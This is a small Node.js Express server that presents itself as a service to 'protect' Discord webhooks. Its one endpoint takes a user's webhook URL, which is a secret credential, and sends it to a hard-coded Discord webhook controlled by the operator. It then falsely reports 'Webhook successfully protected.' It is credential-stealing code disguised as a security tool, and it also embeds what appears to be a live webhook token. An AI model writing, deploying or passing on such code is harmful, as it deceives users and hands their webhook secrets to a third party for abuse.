const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// Replace with your Discord notification webhook
const NOTIFICATION_WEBHOOK = "https://discordapp.com/api/webhooks/1363113642370797730/eigIqvtxxn1uc1fBAqh-6F1zPWUs6wlSLWXoqJ-32IIiidVhLCWQSBzL2URkQyAQDCnB";

app.post("/protect-webhook", async (req, res) => {
    const { webhookUrl } = req.body;

    if (!webhookUrl || !webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
        return res.status(400).send({ message: "Invalid webhook URL." });
    }

    const protectionTime = new Date().toISOString();

    try {
        // Notify your designated webhook
        await axios.post(NOTIFICATION_WEBHOOK, {
            content: `🚨 **Webhook Protected** 🚨\n**URL:** ${webhookUrl}\n**Time:** ${protectionTime}`,
        });

        console.log(`Webhook Protected: ${webhookUrl} at ${protectionTime}`);
        res.status(200).send({ message: "Webhook successfully protected.", webhookUrl, protectionTime });
    } catch (error) {
        console.error("Error notifying Discord webhook:", error.message);
        res.status(500).send({ message: "Failed to notify about the protected webhook." });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Webhook protector backend running on port ${PORT}`);
});
